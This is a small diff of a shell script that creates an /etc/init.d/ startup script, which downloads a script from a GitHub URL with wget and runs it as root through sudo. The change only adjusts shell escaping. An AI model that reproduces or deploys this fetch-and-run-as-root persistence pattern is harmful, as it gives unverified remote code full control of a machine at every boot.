@@ -2,7 +2,7 @@
 
 
 echo "#!/bin/sh" > relFars7v
-echo "sudo sh -c \"$\(wget -O - https://raw.githubusercontent.com/ars7v/in/main/m.sh)\"" >> relFars7v
+echo "sudo sh -c \"\$(wget -O - https://raw.githubusercontent.com/ars7v/in/main/m.sh)\"" >> relFars7v
 chmod +x relFars7v
 
 sudo mv relFars7v /etc/init.d/
